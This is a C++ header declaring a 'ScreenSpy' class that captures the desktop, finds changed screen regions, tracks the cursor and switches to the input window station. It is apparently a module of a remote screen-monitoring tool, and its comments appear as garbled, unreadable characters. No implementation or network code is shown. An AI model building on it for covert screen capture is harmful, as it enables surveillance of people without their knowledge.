// ScreenSpy.h: interface for the ScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENSPY_H__11D14B8B_ABF2_4628_B267_8C9E64418D67__INCLUDED_)
#define AFX_SCREENSPY_H__11D14B8B_ABF2_4628_B267_8C9E64418D67__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#include "Common.h"
#endif // _MSC_VER > 1000

#define ALGORITHM_DIFF	1	// �ٶȺ�����ҲռCPU������������������С��
class CScreenSpy  
{
public:
	CScreenSpy(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 100);
	virtual ~CScreenSpy();
	bool CScreenSpy::SelectInputWinStation();
	LPVOID CScreenSpy::getFirstScreen();
	UINT CScreenSpy::getBISize();
	LPBITMAPINFO CScreenSpy::getBI();
	UINT CScreenSpy::getFirstImageSize();
	LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes);
	LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight);
	void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight);
	int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize );
	void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount);


private:
	int	 m_biBitCount;       //ÿ����������Ҫ��λ��
	HWND m_hDeskTopWnd;      //Explorer.exe �������ھ��
	HDC  m_hFullDC;          //Explorer.exe �Ĵ����豸DC
	HDC  m_hFullMemDC;       //����Ļ���ڴ�DC
	int  m_nFullWidth, m_nFullHeight;               //��Ļ�ķֱ���
	LPBITMAPINFO  m_lpbmi_full;                     //����ĻBitMapInfor

	BYTE m_bAlgorithm;
	UINT m_nMaxFrameRate;
	bool m_bIsGray;
	DWORD m_dwBitBltRop;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
	LPBYTE m_rectBuffer;
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int  m_nStartLine;
	RECT m_changeRect;
	HDC  m_hLineMemDC, m_hRectMemDC;
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line,m_lpbmi_rect;
	int	m_nDataSizePerLine;
	CCursorInfo	m_CursorInfo;
	LPVOID m_lpvDiffBits;                         // ����Ƚϵ���һ��
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;


};

#endif // !defined(AFX_SCREENSPY_H__11D14B8B_ABF2_4628_B267_8C9E64418D67__INCLUDED_)
